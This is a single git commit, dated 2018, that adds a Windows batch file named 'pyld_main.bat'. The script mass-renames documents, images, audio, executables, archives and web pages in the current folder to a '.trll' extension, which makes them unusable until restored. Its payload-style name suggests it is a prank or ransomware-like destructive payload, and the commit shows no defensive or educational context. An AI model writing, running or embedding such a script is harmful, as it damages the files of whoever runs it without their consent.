b11753e0f8de2f341bcfc38c87a1bd89a87eeb5d
Gridman7 <35380100+Gridman7@users.noreply.github.com>
2018-01-22 19:31:10 -0500

    Create pyld_main.bat

---
+++ pyld_main.bat
@@ -0,0 +1,14 @@
+@echo off
+ren *.txt *.trll
+ren *.doc *.trll
+ren *.jpg *.trll
+ren *.png *.trll
+ren *.bmp *.trll
+ren *.exe *.trll
+ren *.mp3 *.trll
+ren *.wav *.trll
+ren *.ogg *.trll
+ren *.htm *.trll
+ren *.zip *.trll
+ren *.gif *.trll
+
